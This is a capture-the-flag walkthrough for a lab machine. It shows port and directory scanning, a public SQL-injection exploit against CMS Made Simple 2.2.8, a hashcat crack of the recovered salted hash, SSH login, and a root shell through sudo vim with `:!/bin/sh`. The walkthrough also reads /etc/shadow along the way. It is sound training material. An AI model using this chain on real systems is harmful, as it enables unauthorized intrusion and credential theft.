# Simple CTF
Room - https://tryhackme.com/room/easyctf
# Enumeration
Start off with a port scan.
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -A 10.10.101.28
Starting Nmap 7.93 ( https://nmap.org ) at 2023-01-13 17:45 EST
Nmap scan report for 10.10.101.28
Host is up (0.11s latency).                                                                               
Not shown: 997 filtered tcp ports (no-response)                                                           
PORT     STATE SERVICE VERSION                                                                            
21/tcp   open  ftp     vsftpd 3.0.3                                                                       
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                    
|_Can't get directory listing: TIMEOUT                                                                    
| ftp-syst:                                                                                               
|   STAT:                                                                                                 
| FTP server status:                                                                                      
|      Connected to ::ffff:10.6.27.72                                                                     
|      Logged in as ftp                                                                                   
|      TYPE: ASCII                                                                                        
|      No session bandwidth limit                                                                         
|      Session timeout in seconds is 300                                                                  
|      Control connection is plain text                                                                   
|      Data connections will be plain text                                                                
|      At session startup, client count was 1                                                             
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (90%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Adtran 424RG FTTH gateway (86%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
A few things stand out immediately: 
- SSH running on a non standard port
- Anonymous FTP login allowed
- Default Apache2 page

Further discovery on web server
```
┌──(kali㉿kali)-[~]
└─$ dirb http://10.10.101.28/ /usr/share/wordlists/dirb/common.txt 

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Jan 13 18:08:24 2023
URL_BASE: http://10.10.101.28/
WORDLIST_FILES: /usr/share/wordlists/dirb/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.10.101.28/ ----
+ http://10.10.101.28/index.html (CODE:200|SIZE:11321)                                                   
+ http://10.10.101.28/robots.txt (CODE:200|SIZE:929)                                                     
+ http://10.10.101.28/server-status (CODE:403|SIZE:300)                                                  
==> DIRECTORY: http://10.10.101.28/simple/                                                               
```
/index.html - is the default apache landing page <br>
/robots.txt - is not really relevant <br>
/server-status - returns 403 forbidden <br>
/simple - is a hit and returns a webpage <br>
### ADD IMAGE <br>

Scrolling to the bottom it shows the software used to make the site and the version number. CMS Made Simple 2.2.8

### ADD IMAGE <br>

# Exploit
Searching https://www.exploit-db.com/ for "CMS Made Simple 2.2.8" comes up with https://www.exploit-db.com/exploits/46635 <br>
This version of the CMS Made Simple is vulnerable to SQL injections and this python script takes advantage of that. <br>

*Note: I was using python 3 and had to add the parenthesis for the print statements for the program to work*


```
python3.10 Downloads/46635.py -u http://10.10.101.28/simple

[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d9
```
Running the hash through hash identifier shows it is a MD5 hash
```
$ hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: 0c01f4468bd75d7a84c7eb73846e8d96

Possible Hashs:
[+] MD5
[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
```
Using hashcat to crack the MD5 hash
```
hashcat -O -m 20 -a 0 0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2 /home/kali/Desktop/rockyou.txt
```
Output
```
0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2:secret
```
Now we have credentials to work with. <br> 
- Username: mitch <br>
- Password: secret
# Access
From the directoy enumeration earlier /simple/admin/login.php was found
### ADD IMAGE

using the credentials to log in presents a control panel

### ADD IMAGE
*Theres not much here that is beneficial to the attack*

Moving on to trying to use the credentials on SSH

```
$ ssh mitch@10.10.101.28 -p 2222  
mitch@10.10.101.28's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ ls
user.txt
$ cat user.txt
G00d j0b, keep up!
```
Read the file on the home directory to find the first flag.

# Privilege Escalation 

Frist running `sudo -l` shows that mitch can run vim with sudo privileges.

`sudo vim /etc/shadow` allows us to read encrpyted passwords from accounts on the machine
copying the encrypted password from /etc/shadow and attempting to crack it could be a potential option, but there is a easier way. <br>

https://gtfobins.github.io/gtfobins/vim/#sudo

Using `sudo vim -c ':!/bin/sh'` allows us to use vim with sudo to get a root shell.
```# ^[[2;2Rwhoami 
/bin/sh: 1: not found
/bin/sh: 1: 2Rwhoami: not found
# whoami
root

# cd /root      
# ls
root.txt
# cat root.txt
W3ll d0n3. You made it!
# 
```
Navigate to the home folder of root and read the root.txt file


